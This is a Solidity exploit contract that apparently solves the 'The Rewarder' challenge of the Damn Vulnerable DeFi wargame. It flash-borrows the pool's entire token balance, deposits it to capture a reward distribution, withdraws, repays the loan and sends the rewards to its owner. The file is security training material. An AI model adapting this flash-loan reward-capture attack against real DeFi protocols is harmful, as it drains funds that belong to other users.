//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/RewardToken.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract AttackRewarder {
    address payable owner;
    RewardToken rewardToken;
    TheRewarderPool rewarderPool;
    FlashLoanerPool flashLoanPool;
    DamnValuableToken damnValuableToken;

    constructor(
        address _pool,
        address _damnValuableToken,
        address _rewardToken,
        address _rewardPool
    ) {
        owner = payable(msg.sender);
        flashLoanPool = FlashLoanerPool(_pool);
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        rewardToken = RewardToken(_rewardToken);
        rewarderPool = TheRewarderPool(_rewardPool);
    }

    function receiveFlashLoan(uint256 borrowAmount) external {
        damnValuableToken.approve(address(rewarderPool), borrowAmount);
        rewarderPool.deposit(borrowAmount);

        rewarderPool.withdraw(borrowAmount);

        bool returnTokenTx = damnValuableToken.transfer(
            address(flashLoanPool),
            borrowAmount
        );
        require(returnTokenTx, "Flashloan return transaction failed");

        uint256 rewardTokenAmount = rewardToken.balanceOf(address(this));
        bool rewardTokenTransfer = rewardToken.transfer(
            owner,
            rewardTokenAmount
        );

        require(rewardTokenTransfer, "Reward token transfer failed.");
    }

    function attack() external {
        uint256 totalDVTBalance = damnValuableToken.balanceOf(
            address(flashLoanPool)
        );
        flashLoanPool.flashLoan(totalDVTBalance);
    }
}
